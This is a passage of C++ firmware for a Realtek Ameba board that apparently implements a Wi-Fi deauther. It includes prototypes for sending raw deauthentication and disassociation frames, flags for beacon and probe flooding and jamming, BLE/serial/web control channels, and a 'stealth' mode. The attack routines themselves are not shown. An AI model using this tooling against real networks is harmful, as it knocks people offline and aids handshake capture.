  return (buf[hdrLen] == 0xAA && buf[hdrLen + 1] == 0xAA && buf[hdrLen + 2] == 0x03 &&
          buf[hdrLen + 3] == 0x00 && buf[hdrLen + 4] == 0x00 && buf[hdrLen + 5] == 0x00 &&
          buf[hdrLen + 6] == 0x88 && buf[hdrLen + 7] == 0x8E);
}

//==========================================================
// Externs & Prototypes (Realtek / Ameba Specific)
//==========================================================
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);
extern "C" void rtw_free_xmitbuf(void* pxmitpriv, void* pxmitbuf);
extern "C" void rtw_free_xmitframe(void* pxmitpriv, void* pxmitframe);
extern "C" int wifi_get_mac_address(char *mac);

void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x06);
void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x08);
int scanNetworks(bool emitBegin = true, bool isSync = false);
void printScanResults();
bool applyTargetSpec(const String &spec, bool allowClear, String &errMsg);
bool executeCommand(String command, String *errOut = nullptr, bool fromHttp = false);
void handleCommand(String command);
bool parseStrictLong(const String &s, long &out);
bool validateConfigSetting(const String &key, const String &rawValue, String &errMsg);
bool applyConfigSetting(const String &key, const String &rawValue, bool &apChanged);
void targetAttack();
void startTimedAttack(unsigned long durationMs);
void checkTimedAttack();
void handleWebClient();
String getScanResultsJSON();
String getStatusJSON();
String getInfoJSON();
String jsonEscapeTruncated(const String &s, size_t maxEscapedBytes, const char *ellipsis = "...");
String jsonEscape(const String &s);
extern const char INDEX_HTML[];

//==========================================================
// Global Vectors & Scan Mutex
//==========================================================
std::vector<WiFiScanResult> scan_results;
std::vector<WiFiScanResult> target_aps;
SemaphoreHandle_t scanMutex = NULL;

//==========================================================
// Disassociation Attack Control
//==========================================================
bool disassoc_enabled           = false;
unsigned long disassoc_interval = 1000;
unsigned long last_disassoc_attack = 0;
bool attack_enabled             = false;
bool scan_enabled               = false;
bool target_mode                = false;
uint32_t tx_success_count       = 0;
uint32_t tx_fail_count          = 0;

//==========================================================
// BLE (Nordic UART Service) — Android App control channel
//==========================================================
#define UART_SERVICE_UUID       "6E400001-B5A3-F393-E0A9-E50E24DCCA9E"
#define CHARACTERISTIC_UUID_RX  "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"
#define CHARACTERISTIC_UUID_TX  "6E400003-B5A3-F393-E0A9-E50E24DCCA9E"
#define BLE_BUF_SIZE            220   // < CHAR_VALUE_MAX_LEN (230)

BLEService UartService(UART_SERVICE_UUID);
BLECharacteristic BleRx(CHARACTERISTIC_UUID_RX);
BLECharacteristic BleTx(CHARACTERISTIC_UUID_TX);
BLEAdvertData advdata;
BLEAdvertData scndata;
volatile bool bleNotifyEnabled = false;
volatile uint8_t activeConnId = 0;  // 当前 BLE 连接 ID（所有跨任务读写均受临界区保护）
volatile bool bleStarted = false;
volatile bool bleAdvUpdateInProgress = false;
volatile T_GAP_CONN_STATE bleGapConnState = GAP_CONN_STATE_DISCONNECTED;

// GAP telemetry & negotiation state shared between appGapCallback (BT task) and loop() (1A+1C+4A)
struct BleGapTelemetry {
  bool evConnected = false;
  bool evDisconnected = false;
  bool evParamUpdated = false;
  bool evParamUpdateFailed = false;
  bool evPhyUpdated = false;
  bool evMtuUpdated = false;
  bool evConnUpdateInd = false;

  uint8_t connId = 0;
  uint16_t initInterval = 0;
  uint16_t initLatency = 0;
  uint16_t initTimeout = 0;
  uint8_t initTxPhy = 0;
  uint8_t initRxPhy = 0;

  uint8_t discConnId = 0;
  uint16_t discCause = 0;

  uint16_t updInterval = 0;
  uint16_t updLatency = 0;
  uint16_t updTimeout = 0;
  uint16_t paramFailCause = 0;

  uint16_t phyCause = 0;
  uint8_t phyTx = 0;
  uint8_t phyRx = 0;

  uint8_t mtuConnId = 0;
  uint16_t mtuSize = 23;

  uint16_t indMin = 0;
  uint16_t indMax = 0;
  uint16_t indLat = 0;
  uint16_t indTout = 0;
  bool indRejected = false;

  bool negotiatePending = false;
  uint8_t negotiateAttempts = 0;
  unsigned long connectedAtMs = 0;
  unsigned long lastNegotiateMs = 0;

  bool phyReassertDone = false;
  uint8_t phyReassertAttempts = 0;
  unsigned long lastPhyReqMs = 0;
};

BleGapTelemetry bleGapDiag;
volatile uint32_t bleDroppedLogCount = 0;
unsigned long lastBleDroppedWarnMs = 0;

// Adaptive BLE sniff-log congestion control & pacing (P0-2)
#define BLE_SNIFF_BASE_INTERVAL_MS     100UL
#define BLE_SNIFF_LOW_MTU_INTERVAL_MS  220UL
#define BLE_SNIFF_MAX_BACKOFF_MS       800UL
unsigned long bleLogBackoffMs = BLE_SNIFF_BASE_INTERVAL_MS;
unsigned long lastBleRoutineLogMs = 0;
unsigned long lastBlePriorityLogMs = 0;

// Cross-thread command ring queue (BLE task -> loop)
#define CMD_RING_SIZE 16
char cmdRing[CMD_RING_SIZE][BLE_BUF_SIZE];
volatile uint8_t cmdHead = 0;
volatile uint8_t cmdTail = 0;

// Non-blocking Serial line buffer & pending command queue (main loop only)
#define SERIAL_CMD_QUEUE_SIZE 8
char serialRxBuf[BLE_BUF_SIZE];
size_t serialRxLen = 0;
bool serialRxOverflow = false;
char serialCmdQueue[SERIAL_CMD_QUEUE_SIZE][BLE_BUF_SIZE];
uint8_t serialCmdHead = 0;
uint8_t serialCmdTail = 0;

// Cross-thread sniff log ring buffer (WiFi promisc thread -> loop)
char sniffLogRing[LOG_RING_SIZE][LOG_STR_LEN];
volatile uint8_t logHead = 0;
volatile uint8_t logTail = 0;
volatile uint32_t droppedLogCount = 0;

// WebUI sniff log history buffer (persists across timed sniff sessions for /api/logs)
#define WEB_LOG_HISTORY_SIZE 32
char webLogHistory[WEB_LOG_HISTORY_SIZE][LOG_STR_LEN];
volatile uint8_t webLogHead = 0;
volatile uint8_t webLogCount = 0;

static inline bool lockScanMutex(TickType_t ticksToWait = portMAX_DELAY) {
  if (scanMutex == NULL) return true;
  return xSemaphoreTake(scanMutex, ticksToWait) == pdTRUE;
}

static inline void unlockScanMutex() {
  if (scanMutex != NULL) {
    xSemaphoreGive(scanMutex);
  }
}

std::vector<WiFiScanResult> snapshotScanResults() {
  std::vector<WiFiScanResult> copy;
  if (lockScanMutex()) {
    copy = scan_results;
    unlockScanMutex();
  }
  return copy;
}

std::vector<WiFiScanResult> snapshotTargetAps() {
  std::vector<WiFiScanResult> copy;
  if (lockScanMutex()) {
    copy = target_aps;
    unlockScanMutex();
  }
  return copy;
}

std::vector<WiFiScanResult> snapshotDisassocTargets() {
  std::vector<WiFiScanResult> copy;
  if (lockScanMutex()) {
    // 决策 A：严禁在未选择目标或 target_mode == false 时回退全量 scan_results
    if (target_mode && !target_aps.empty()) {
      copy = target_aps;
    }
    unlockScanMutex();
  }
  return copy;
}

size_t getScanCountSafe() {
  size_t count = 0;
  if (lockScanMutex()) {
    count = scan_results.size();
    unlockScanMutex();
  }
  return count;
}

size_t getTargetCountSafe() {
  size_t count = 0;
  if (lockScanMutex()) {
    count = target_aps.size();
    unlockScanMutex();
  }
  return count;
}

void getScanAndTargetCountsSafe(size_t &scanCountOut, size_t &targetCountOut, bool &targetModeOut) {
  scanCountOut = 0;
  targetCountOut = 0;
  targetModeOut = false;
  if (lockScanMutex()) {
    scanCountOut = scan_results.size();
    targetCountOut = target_aps.size();
    targetModeOut = target_mode;
    unlockScanMutex();
  }
}

bool isStopCmdCstr(const char *s) {
  if (!s) return false;
  return (strcasecmp(s, "stop") == 0 ||
          strcasecmp(s, "stop all") == 0 ||
          strcasecmp(s, "stop deauther") == 0);
}

bool hasQueuedStopInCmdRing() {
  bool found = false;
  rtw_enter_critical(NULL, NULL);
  if (priorityStopPending) {
    found = true;
  } else {
    uint8_t idx = cmdTail;
    while (idx != cmdHead) {
      if (isStopCmdCstr(cmdRing[idx])) {
        found = true;
        break;
      }
      idx = (idx + 1) % CMD_RING_SIZE;
    }
  }
  rtw_exit_critical(NULL, NULL);
  return found;
}

bool consumePriorityStopIfPending() {
  bool pending = false;
  rtw_enter_critical(NULL, NULL);
  if (priorityStopPending) {
    priorityStopPending = false;
    pending = true;
  }
  rtw_exit_critical(NULL, NULL);
  if (pending) {
    handleCommand("stop");
  }
  return pending;
}

bool startsWithIgnoreCase(const String &s, const char *prefix) {
  if (!prefix) return false;
  size_t plen = strlen(prefix);
  if (s.length() < plen) return false;
  return strncasecmp(s.c_str(), prefix, plen) == 0;
}

void pollSerialInput() {
  while (Serial.available() > 0) {
    int raw = Serial.read();
    if (raw < 0) break;
    char c = (char)raw;
    if (c == '\0') continue;
    if (c == '\r' || c == '\n') {
      if (serialRxOverflow) {
        serialRxOverflow = false;
        serialRxLen = 0;
        Serial.println("[ERROR] Serial line too long; discarded.");
        continue;
      }
      serialRxBuf[serialRxLen] = '\0';
      size_t start = 0;
      while (start < serialRxLen && (serialRxBuf[start] == ' ' || serialRxBuf[start] == '\t')) {
        start++;
      }
      size_t end = serialRxLen;
      while (end > start && (serialRxBuf[end - 1] == ' ' || serialRxBuf[end - 1] == '\t')) {
        end--;
      }
      serialRxBuf[end] = '\0';
      if (end > start) {
        const char *line = &serialRxBuf[start];
        if (isStopCmdCstr(line)) {
          Serial.print("> ");
          Serial.println(line);
          rtw_enter_critical(NULL, NULL);
          emergencyStopRequested = true;
          priorityStopPending = true;
          rtw_exit_critical(NULL, NULL);
          // 急停直接走优先通道并清空待执行的旧串口指令，避免旧指令延后执行
          serialCmdHead = serialCmdTail;
        } else {
          uint8_t next = (serialCmdHead + 1) % SERIAL_CMD_QUEUE_SIZE;
          if (next != serialCmdTail) {
            strncpy(serialCmdQueue[serialCmdHead], line, sizeof(serialCmdQueue[0]) - 1);
            serialCmdQueue[serialCmdHead][sizeof(serialCmdQueue[0]) - 1] = '\0';
            serialCmdHead = next;
            Serial.print("> ");
            Serial.println(line);
          } else {
            Serial.println("[WARN] Serial command queue full; dropped command.");
          }
        }
      }
      serialRxLen = 0;
    } else if (!serialRxOverflow) {
      if (serialRxLen + 1 < sizeof(serialRxBuf)) {
        serialRxBuf[serialRxLen++] = c;
      } else {
        serialRxOverflow = true;
      }
    }
  }
}

//==========================================================
// Flash Persistence (NVS Config Storage)
//==========================================================
#define CFG_MAGIC   0x57444B33UL  // "WDK3"
#define CFG_VERSION 3

#pragma pack(push, 1)
struct PersistConfig {
  uint32_t magic;
  uint16_t version;
  uint16_t size;
  char ap_ssid[33];
  char ap_pass[65];
  char ble_name[27];
  uint32_t cycle_delay;
  uint32_t scan_time;
  uint32_t num_send_frames;
  int32_t start_channel;
  uint8_t scan_between_cycles;
  uint8_t use_led;
  uint32_t crc32;
};
#pragma pack(pop)

uint32_t calcCrc32(const uint8_t *data, size_t len) {
  uint32_t crc = 0xFFFFFFFFUL;
  for (size_t i = 0; i < len; i++) {
    crc ^= data[i];
    for (int b = 0; b < 8; b++) {
      crc = (crc & 1) ? ((crc >> 1) ^ 0xEDB88320UL) : (crc >> 1);
    }
  }
  return crc ^ 0xFFFFFFFFUL;
}

void loadConfigFromFlash() {
  FlashMemory.read();
  PersistConfig cfg;
  memcpy(&cfg, FlashMemory.buf, sizeof(PersistConfig));
  if (cfg.magic != CFG_MAGIC || cfg.version != CFG_VERSION || cfg.size != sizeof(PersistConfig)) {
    Serial.println("[CFG] No valid flash config found, using defaults.");
    return;
  }
  uint32_t expectedCrc = calcCrc32((const uint8_t *)&cfg, offsetof(PersistConfig, crc32));
  if (cfg.crc32 != expectedCrc) {
    Serial.println("[CFG] Flash config CRC32 mismatch, using defaults.");
    return;
  }

  cfg.ap_ssid[32] = '\0';
  cfg.ap_pass[64] = '\0';
  cfg.ble_name[26] = '\0';

  if (strlen(cfg.ap_ssid) >= 1 && strlen(cfg.ap_ssid) <= 32) {
    strcpy(ap_ssid, cfg.ap_ssid);
  }
  if (strlen(cfg.ap_pass) >= 8 && strlen(cfg.ap_pass) <= 63) {
    strcpy(ap_pass, cfg.ap_pass);
  }
  if (strlen(cfg.ble_name) >= 1 && strlen(cfg.ble_name) <= 26) {
    strcpy(ble_name, cfg.ble_name);
  }
  if (cfg.cycle_delay >= 100 && cfg.cycle_delay <= 60000) {
    cycle_delay = cfg.cycle_delay;
  }
  if (cfg.scan_time >= 500 && cfg.scan_time <= 30000) {
    scan_time = cfg.scan_time;
  }
  if (cfg.num_send_frames >= 1 && cfg.num_send_frames <= 100) {
    num_send_frames = cfg.num_send_frames;
  }
  if (cfg.start_channel == 1 || (cfg.start_channel >= 36 && cfg.start_channel <= 165)) {
    start_channel = cfg.start_channel;
  }
  // 严格规范化布尔标志：避免空白 Flash 的 0xFF 字节被当作 true
  if (cfg.scan_between_cycles == 0 || cfg.scan_between_cycles == 1) {
    scan_between_cycles = (cfg.scan_between_cycles == 1);
  }
  if (cfg.use_led == 0 || cfg.use_led == 1) {
    USE_LED = (cfg.use_led == 1);
  }
  Serial.println("[CFG] Loaded config from Flash: SSID='" + String(ap_ssid) + "', BLE='" + String(ble_name) + "'");
}

void saveConfigToFlash() {
  PersistConfig cfg;
  memset(&cfg, 0, sizeof(PersistConfig));
  cfg.magic = CFG_MAGIC;
  cfg.version = CFG_VERSION;
  cfg.size = (uint16_t)sizeof(PersistConfig);
  strncpy(cfg.ap_ssid, ap_ssid, sizeof(cfg.ap_ssid) - 1);
  strncpy(cfg.ap_pass, ap_pass, sizeof(cfg.ap_pass) - 1);
  strncpy(cfg.ble_name, ble_name, sizeof(cfg.ble_name) - 1);
  cfg.cycle_delay = cycle_delay;
  cfg.scan_time = scan_time;
  cfg.num_send_frames = num_send_frames;
  cfg.start_channel = start_channel;
  cfg.scan_between_cycles = scan_between_cycles ? 1 : 0;
  cfg.use_led = USE_LED ? 1 : 0;
  cfg.crc32 = calcCrc32((const uint8_t *)&cfg, offsetof(PersistConfig, crc32));

  FlashMemory.read();
  if (memcmp(FlashMemory.buf, &cfg, sizeof(PersistConfig)) == 0) {
    Serial.println("[CFG] Flash config unchanged, skip erase/write.");
    return;
  }
  memcpy(FlashMemory.buf, &cfg, sizeof(PersistConfig));
  FlashMemory.update();
}

//==========================================================
// Web Server (Direct lwIP BSD Sockets with SO_REUSEADDR)
//==========================================================
// Bypasses AmebaD WiFiServer/ard_socket start_server() which lacks SO_REUSEADDR,
// leaks _sock on bind() failure, and causes UB in get_sock_errno(-1) / Spin on EAGAIN.
static int webListenSock = -1;

bool webServerRunning() {
  return webListenSock >= 0;
}

void stopWebServer() {
  if (webListenSock >= 0) {
    lwip_close(webListenSock);
    webListenSock = -1;
  }
}

bool startWebServer(uint8_t maxRetries) {
  if (maxRetries == 0) maxRetries = 1;
  stopWebServer();

  for (uint8_t attempt = 0; attempt < maxRetries; attempt++) {
    feedWatchdog();
    int fd = lwip_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (fd < 0) {
      Serial.println("[ERROR] WebServer lwip_socket() failed");
    } else {
      int reuse = 1;
      int rcvTimeoutMs = 3000;
      lwip_setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
      lwip_setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &rcvTimeoutMs, sizeof(rcvTimeoutMs));

      int flags = lwip_fcntl(fd, F_GETFL, 0);
      if (flags >= 0) {
        lwip_fcntl(fd, F_SETFL, flags | O_NONBLOCK);
      }

      struct sockaddr_in localAddr;
      memset(&localAddr, 0, sizeof(localAddr));
      localAddr.sin_family = AF_INET;
      localAddr.sin_port = htons(80);
      localAddr.sin_addr.s_addr = INADDR_ANY;

      if (lwip_bind(fd, (struct sockaddr *)&localAddr, sizeof(localAddr)) < 0) {
        int err = lwip_getsocklasterr(fd);
        lwip_close(fd);
        Serial.print("[ERROR] WebServer bind(80) failed errno=");
        Serial.print(err);
        Serial.print(" attempt=");
        Serial.println((unsigned)(attempt + 1));
      } else if (lwip_listen(fd, 4) < 0) {
        int err = lwip_getsocklasterr(fd);
        lwip_close(fd);
        Serial.print("[ERROR] WebServer listen(80) failed errno=");
        Serial.print(err);
        Serial.print(" attempt=");
        Serial.println((unsigned)(attempt + 1));
      } else {
        webListenSock = fd;
        return true;
      }
    }
    if (attempt + 1 < maxRetries) {
      unsigned long backoffMs = 50UL * (unsigned long)(attempt + 1);
      delay(backoffMs);
      feedWatchdog();
    }
  }
  return false;
}

static int acceptWebClient() {
  if (webListenSock < 0) return -1;
  struct sockaddr_in peerAddr;
  socklen_t peerLen = sizeof(peerAddr);
  int cli = lwip_accept(webListenSock, (struct sockaddr *)&peerAddr, &peerLen);
  if (cli < 0) {
    return -1;
  }
  int flags = lwip_fcntl(cli, F_GETFL, 0);
  if (flags >= 0) {
    lwip_fcntl(cli, F_SETFL, flags & ~O_NONBLOCK);
  }
  int reuse = 1;
  int rcvTimeoutMs = 25;
  int sndTimeoutMs = 1500;
  int nodelay = 1;
  // Inherit SO_REUSEADDR on client sockets too so lingering FIN_WAIT PCBs never block bind(80) after AP restart
  lwip_setsockopt(cli, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
  lwip_setsockopt(cli, SOL_SOCKET, SO_RCVTIMEO, &rcvTimeoutMs, sizeof(rcvTimeoutMs));
  lwip_setsockopt(cli, SOL_SOCKET, SO_SNDTIMEO, &sndTimeoutMs, sizeof(sndTimeoutMs));
  lwip_setsockopt(cli, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
  return cli;
}

static int webClientRecv(int sock, uint8_t *buf, size_t len, bool &peerClosedOrErr) {
  peerClosedOrErr = false;
  if (sock < 0 || !buf || len == 0) {
    peerClosedOrErr = true;
    return -1;
  }
  int r = lwip_recv(sock, buf, len, 0);
  if (r > 0) return r;
  if (r == 0) {
    peerClosedOrErr = true;
    return 0;
  }
  int err = lwip_getsocklasterr(sock);
  if (err == EAGAIN || err == EWOULDBLOCK || err == EINTR) {
    return 0;
  }
  peerClosedOrErr = true;
  return -1;
}

static void closeWebClient(int &sock, bool gracefulDrain) {
  if (sock < 0) return;
  if (gracefulDrain) {
    lwip_shutdown(sock, SHUT_WR);
    int flags = lwip_fcntl(sock, F_GETFL, 0);
    if (flags >= 0) {
      lwip_fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    }
    uint8_t sink[64];
    for (int i = 0; i < 4; i++) {
      int r = lwip_recv(sock, sink, sizeof(sink), 0);
      if (r <= 0) break;
    }
    delay(5);
  }
  lwip_close(sock);
  sock = -1;
}

// Wi-Fi 重启/切模后重新启用 Wi-Fi/BLE 共存仲裁，避免 BLE notify 吞吐或广播被抑制
void restoreBleCoex(bool resetCoex) {
  if (!bleStarted) return;
  wifi_btcoex_set_bt_on();
  // rtw_coex_bt_enable(0/1) 直接操作 pcoex，仅在 WLAN 接口已就绪时调用
  if (wifi_is_up(RTW_STA_INTERFACE) || wifi_is_up(RTW_AP_INTERFACE)) {
    if (resetCoex) {
      rltk_coex_bt_enable(0);
    }
    rltk_coex_bt_enable(1);
  }
}

void scheduleApRestart() {
  bool sniffingNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffingNow = isSniffing;
  rtw_exit_critical(NULL, NULL);
  if (apEnabled && !sniffingNow) {
    pendingApRestart = true;
    pendingApRestartAt = millis();
  }
}

void restoreDefaultChannelIfNeeded(bool force) {
  if (force || apEnabled || softApActive) {
    if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
      setCurrentChannelSafe(WIFI_CHANNEL);
    }
  }
}

bool isSoftApHealthy() {
  int wextMode = -1;
  return (wlanRuntimeMode == WLAN_MODE_AP &&
          softApActive &&
          wifi_is_up(RTW_AP_INTERFACE) &&
          wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
          wextMode == RTW_MODE_MASTER);
}

bool startSoftAP() {
  // Close any previous listening socket before tearing down WLAN to prevent lwIP socket leak
  stopWebServer();
  softApActive = false;
  apEnabled = true;
  feedWatchdog();

  char ch[4];
  snprintf(ch, sizeof(ch), "%d", WIFI_CHANNEL);

  for (uint8_t attempt = 0; attempt < 2; attempt++) {
    if (attempt > 0) {
      Serial.println("[WARN] startSoftAP: retrying AP + WebServer recovery...");
    }
    // 修复 WiFiDrv 静态 init_wlan/wifi_mode 失同步（2-OptA）：
    // 首次启动由 WiFi.apbegin()->wifiDriverInit() 完成 LwIP_Init；后续重启 WiFiDrv::wifi_mode 仍为
    // RTW_MODE_AP，会跳过 wifi_on(RTW_MODE_AP)，因此必须显式重置为 RTW_MODE_AP。
    if (wlanLwipInitialized) {
      wifi_off();
      feedWatchdog();
      delay(40);
      if (wifi_on(RTW_MODE_AP) != RTW_SUCCESS) {
        wlanRuntimeMode = WLAN_MODE_UNINIT;
        Serial.println("[ERROR] startSoftAP: wifi_on(RTW_MODE_AP) failed");
        continue;
      }
      delay(20);
      feedWatchdog();
    } else if (wlanRuntimeMode != WLAN_MODE_UNINIT) {
      wifi_off();
      feedWatchdog();
      delay(40);
    }

    int apRes = WiFi.apbegin(ap_ssid, ap_pass, ch, 0);
    wlanLwipInitialized = true;
    feedWatchdog();

    int wextMode = -1;
    bool apUp = (apRes == WL_CONNECTED &&
                 wifi_is_up(RTW_AP_INTERFACE) &&
                 wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
                 wextMode == RTW_MODE_MASTER);
    if (!apUp) {
      wlanRuntimeMode = wifi_is_up(RTW_AP_INTERFACE) ? WLAN_MODE_AP : WLAN_MODE_UNINIT;
      Serial.println("[ERROR] startSoftAP: WiFi.apbegin() failed or AP interface not up");
      continue;
    }

    wlanRuntimeMode = WLAN_MODE_AP;
    WiFi.disablePowerSave();
    softApActive = true;
    setCurrentChannelSafe(WIFI_CHANNEL);
    restoreBleCoex(true);

    if (startWebServer(3)) {
      return true;
    }
    Serial.println("[ERROR] startSoftAP: WebServer bind(80) failed after retries");
    stopWebServer();
    softApActive = false;
  }

  int wextMode = -1;
  if (wifi_is_up(RTW_AP_INTERFACE) &&
      wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
      wextMode == RTW_MODE_MASTER) {
    wlanRuntimeMode = WLAN_MODE_AP;
    WiFi.disablePowerSave();
    softApActive = true;
    setCurrentChannelSafe(WIFI_CHANNEL);
    restoreBleCoex(true);
    return webServerRunning();
  }

  wlanRuntimeMode = WLAN_MODE_UNINIT;
  softApActive = false;
  WiFi.disablePowerSave();
  restoreBleCoex(false);
  return false;
}

// 切换至纯 STA 模式并恢复默认信道与 BLE 共存（供 ap off 与抓包退出/失败回滚复用）
bool enterStaMode(const char *context) {
  stopWebServer();
  softApActive = false;
  int wextMode = -1;
  bool alreadySta = (wlanRuntimeMode == WLAN_MODE_STA &&
                   wifi_is_up(RTW_STA_INTERFACE) &&
                   !wifi_is_up(RTW_AP_INTERFACE) &&
                   wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
                   wextMode == RTW_MODE_INFRA);
  if (!alreadySta) {
    wifi_off();
    feedWatchdog();
    delay(40);
    if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
      wlanRuntimeMode = WLAN_MODE_UNINIT;
      Serial.print("[ERROR] wifi_on(RTW_MODE_STA) failed");
      if (context && context[0] != '\0') {
        Serial.print(" (");
        Serial.print(context);
        Serial.print(")");
      }
      Serial.println(".");
      restoreBleCoex(false);
      return false;
    }
    delay(20);
    feedWatchdog();
    wlanRuntimeMode = WLAN_MODE_STA;
  }
  WiFi.disablePowerSave();
  restoreBleCoex(!alreadySta);
  if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
    setCurrentChannelSafe(WIFI_CHANNEL);
  } else {
    Serial.print("[WARN] wifi_set_channel(");
    Serial.print(WIFI_CHANNEL);
    Serial.println(") failed after STA switch.");
  }
  return true;
}

// 抓包退出或启用混杂回调失败后，按 apEnabled 恢复 SoftAP 或 BLE-only STA 模式
void restoreRadioAfterSniff() {
  if (apEnabled) {
    // Entering promiscuous mode turned the Wi-Fi (and the soft AP) off;
    // bring the AP and web server back up so the phone can reconnect.
    if (startSoftAP()) {
      Serial.print("[INFO] Soft AP restarted: ");
      Serial.println(ap_ssid);
    } else if (softApActive) {
      Serial.println("[WARN] Soft AP radio active, but WebUI port 80 failed to bind (will self-heal).");
    } else {
      Serial.println("[ERROR] Failed to restart Soft AP after sniff!");
    }
  } else {
    // BLE-only stealth mode (ap off): restore STA mode so scan/TX work without broadcasting AP
    if (enterStaMode("restoreRadioAfterSniff")) {
      Serial.println("[INFO] Restored STA mode (BLE-only stealth).");
    }
  }
}

void clearDeauthSniffState() {
  rtw_enter_critical(NULL, NULL);
  bool wasDeauthSniff = deauth_sniff_enabled;
  if (wasDeauthSniff) {
    isHopping = deauth_sniff_prev_hop;
    deauth_sniff_enabled = false;
    deauth_sniff_prev_hop = false;
  }
  has_sniffed_deauth = false;
  rtw_exit_critical(NULL, NULL);
}

void stopAllActiveAttacks() {
  attack_enabled = false;
  disassoc_enabled = false;
  timedAttackEnabled = false;
  scan_enabled = false;
  beacon_flood_enabled = false;
  probe_flood_enabled = false;
  signal_jam_enabled = false;
  deauthSlice.reset();
  disassocSlice.reset();
  if (USE_LED) digitalWrite(LED_B, LOW);
}

void stopConflictingModesBeforeAttack() {
  stopAllActiveAttacks();
  bool sniffActive = false;
  rtw_enter_critical(NULL, NULL);
  sniffActive = (isSniffing || deauth_sniff_enabled);
  rtw_exit_critical(NULL, NULL);
  if (sniffActive) {
    stopSniffing();
  }
}

void prepareRadioForSniff(bool turnOffAp) {
  stopWebServer();
  softApActive = false;
  if (turnOffAp) {
    wifi_off();
    feedWatchdog();
    delay(40);
    wlanRuntimeMode = WLAN_MODE_UNINIT;
  }
}

void startMonitorSniff(SniffMode mode, bool timed, unsigned long dur) {
  if (mode == SNIFF_STOP) return;
  clearDeauthSniffState();
  resetHopState();
  timedSniffEnabled = timed;
  if (timed) {
    sniffStartTime = millis();
    sniffDuration = dur;
  }
  rtw_enter_critical(NULL, NULL);
  currentMode = mode;
  rtw_exit_critical(NULL, NULL);
  startSniffing();
}

//==========================================================
// BLE helpers (Nordic UART Service)
//==========================================================
// 零堆分配 UTF-8 安全截断拷贝，确保不把多字节 UTF-8 字符从中间腰斩（promisc 回调安全）
static void utf8SafeCopy(char *dst, size_t dstSize, const char *src) {
  if (!dst || dstSize == 0) return;
  if (!src) {
    dst[0] = '\0';
    return;
  }
  size_t maxLen = dstSize - 1;
  size_t len = 0;
  while (len < maxLen && src[len] != '\0') {
    len++;
  }
  if (len > 0 && src[len] != '\0') {
    if (((uint8_t)src[len] & 0xC0) == 0x80) {
      size_t back = len;
      while (back > 0 && (((uint8_t)src[back - 1] & 0xC0) == 0x80)) {
        back--;
      }
      if (back > 0 && ((uint8_t)src[back - 1] & 0x80) != 0) {
        len = back - 1;
      } else {
        len = back;
      }
    }
  }
  if (len > 0) {
    memcpy(dst, src, len);
  }
  dst[len] = '\0';
}

void clearSniffLogRingSafe() {
  rtw_enter_critical(NULL, NULL);
  logHead = 0;
  logTail = 0;
  droppedLogCount = 0;
  rtw_exit_critical(NULL, NULL);
}

void pushSniffLog(const char *msg) {
  char safeMsg[LOG_STR_LEN];
  utf8SafeCopy(safeMsg, sizeof(safeMsg), msg);
  size_t copyBytes = strlen(safeMsg) + 1;
  if (copyBytes > LOG_STR_LEN) copyBytes = LOG_STR_LEN;

  rtw_enter_critical(NULL, NULL);
  uint8_t next = (logHead + 1) % LOG_RING_SIZE;
  if (next != logTail) {
    memcpy(sniffLogRing[logHead], safeMsg, copyBytes);
    logHead = next;
  } else {
    droppedLogCount++;
  }
  // Also record into WebUI circular history so /api/logs can inspect captured frames
  memcpy(webLogHistory[webLogHead], safeMsg, copyBytes);
  webLogHead = (webLogHead + 1) % WEB_LOG_HISTORY_SIZE;
  if (webLogCount < WEB_LOG_HISTORY_SIZE) {
    webLogCount++;
  }
  rtw_exit_critical(NULL, NULL);
}

size_t jsonEscapeTruncatedToBuf(const char *src, char *out, size_t outSize, size_t maxEscapedBytes, const char *ellipsis) {
  if (!out || outSize == 0) return 0;
  out[0] = '\0';
  if (!src || src[0] == '\0' || maxEscapedBytes == 0) return 0;

  size_t cap = outSize - 1;
  if (maxEscapedBytes != (size_t)-1 && maxEscapedBytes < cap) {
    cap = maxEscapedBytes;
  }
  size_t ellLen = (ellipsis != nullptr) ? strlen(ellipsis) : 0;
  if (ellLen > cap) ellLen = 0;

  const uint8_t *data = (const uint8_t *)src;
  size_t srcLen = strlen(src);
  size_t i = 0;
  size_t pos = 0;
  size_t lastEllipsisCut = 0;
  bool truncated = false;

  while (i < srcLen) {
    uint8_t c = data[i];
    if (c == 0x00) {
      i++;
      continue;
    }

    char seqBuf[8];
    size_t seqLen = 0;
    size_t consume = 1;

    if (c == '"') {
      seqBuf[0] = '\\'; seqBuf[1] = '"'; seqLen = 2;
    } else if (c == '\\') {
      seqBuf[0] = '\\'; seqBuf[1] = '\\'; seqLen = 2;
    } else if (c == '\b') {
      seqBuf[0] = '\\'; seqBuf[1] = 'b'; seqLen = 2;
    } else if (c == '\f') {
      seqBuf[0] = '\\'; seqBuf[1] = 'f'; seqLen = 2;
    } else if (c == '\n') {
      seqBuf[0] = '\\'; seqBuf[1] = 'n'; seqLen = 2;
    } else if (c == '\r') {
      seqBuf[0] = '\\'; seqBuf[1] = 'r'; seqLen = 2;
    } else if (c == '\t') {
      seqBuf[0] = '\\'; seqBuf[1] = 't'; seqLen = 2;
    } else if (c < 0x20 || c == 0x7F) {
      snprintf(seqBuf, sizeof(seqBuf), "\\u%04x", (unsigned)c);
      seqLen = 6;
    } else if (c < 0x80) {
